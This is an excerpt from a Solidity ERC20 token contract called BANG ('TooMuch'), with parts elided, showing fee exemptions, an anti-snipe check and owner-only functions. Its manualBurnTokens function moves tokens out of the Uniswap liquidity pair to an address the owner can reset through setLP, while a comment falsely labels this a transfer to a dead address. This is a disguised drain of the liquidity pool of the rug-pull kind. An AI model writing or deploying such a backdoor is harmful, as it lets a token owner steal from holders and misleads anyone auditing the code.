...
contract BANG is Context, IERC20, ERC20Ownable {
    using SafeMath for uint256;

    string private constant _name = "TooMuch";
    ...
    constructor(address payable marketing_, address lpTokens_, address locker_)  {
        ...
        _isExcludedFromFee[lpTokens] = true;
        ...
        _isMaxWalletExclude[lpTokens] = true;
        _isMaxWalletExclude[locker] = true;
        ...
        _isExcludedMaxTxnAmount[lpTokens] = true;
        _isExcludedMaxTxnAmount[locker] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(antiSnipe == true) {
            if (from != owner() && to != owner() && to != address(0) && to != decay && !inSwapAndLiquify) {
    ...
    function setLP(address lpTokens_) external authorized() {
        require(lpTokens_ != address(0), "address cannot be 0");
        _isExcludedFromFee[lpTokens] = false;
        lpTokens = lpTokens_;
        _isExcludedFromFee[lpTokens] = true;
    }
    ...
    function manualBurnTokens(uint amount) external authorized() returns (bool){
        ...
        if (amountToBurn > 0){
            _transfer(uniV2Pair, lpTokens, amountToBurn - amount);
        }  // Transfer to dead    
